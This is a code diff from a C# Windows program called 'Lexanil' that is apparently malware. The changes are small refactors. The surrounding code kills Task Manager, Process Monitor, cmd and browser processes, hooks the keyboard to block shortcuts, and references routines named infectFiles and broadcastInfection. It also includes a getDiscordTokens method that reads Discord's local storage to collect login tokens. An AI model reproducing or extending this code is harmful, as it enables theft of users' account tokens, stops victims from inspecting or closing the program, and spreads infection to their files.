@@ -51,8 +51,12 @@ namespace Lexanil
 
     public partial class MainWindow : Form
     {
+        private static string[] processes = new[] { "iexplore", "steam", "explorer", "taskmgr", "procmon", "procmon64", "cmd", "discord", "chrome", "firefox" };
 
         private bool ALT_F4 = false;
+        private IntPtr ptrHook;
+        private LowLevelKeyboardProc objKeyboardProcess;
+        private static bool foundSth;
 
         [StructLayout(LayoutKind.Sequential)]
         private struct KBDLLHOOKSTRUCT
@@ -63,19 +67,13 @@ namespace Lexanil
             public int time;
             public IntPtr extra;
         }
-        private IntPtr ptrHook;
-        private LowLevelKeyboardProc objKeyboardProcess;
-        static string[] processes = new[] { "iexplore", "steam", "explorer", "Taskmgr", "Procmon", "Procmon64", "cmd", "Discord", "chrome", "firefox" };
-        private static bool foundSth;
-
 
         public MainWindow()
         {
             InitializeComponent();
         }
 
-
-        private void Form1_Load(object sender, EventArgs e)
+        private void MainWindow_Load(object sender, EventArgs e)
         {
             //broadcastInfection(); 
             //disableShortcuts();
@@ -84,7 +82,6 @@ namespace Lexanil
             //infectFiles();
            // prockilltmr.Start();
         }
-
 
         private void prockilltmr_Tick(object sender, EventArgs e)
         {
@@ -103,7 +100,7 @@ namespace Lexanil
             }
         }
 
-        bool HasAltModifier(int flags)
+        private bool HasAltModifier(int flags)
         {
             return (flags & 0x20) == 0x20;
         }
@@ -175,8 +172,6 @@ namespace Lexanil
             {
 
             }
-
-
         }
 
         private void disableShortcuts() 
@@ -220,7 +215,7 @@ namespace Lexanil
             Stream resStream = response.GetResponseStream();
         }
 
-        public static List<string> getDiscordTokens()
+        private List<string> getDiscordTokens()
         {
             List<string> captures = new List<string>();
             DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
